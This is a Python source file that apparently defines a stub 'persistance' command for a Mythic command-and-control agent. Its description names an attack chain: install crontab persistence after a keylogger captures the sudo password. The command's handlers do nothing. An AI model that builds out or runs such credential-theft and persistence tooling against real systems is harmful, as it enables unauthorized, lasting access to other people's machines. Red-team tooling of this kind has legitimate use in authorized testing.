from mythic_payloadtype_container.MythicCommandBase import *
import json


class PersistanceArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        pass


class PersistanceCommand(CommandBase):
    cmd = "persistance"
    needs_admin = False
    help_cmd = "persistance"
    description = "crontab persistance after getting sudo psw with the keylogger"
    version = 1
    supported_ui_features = [""]
    author = "@Kayn93"
    argument_class = PersistanceArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
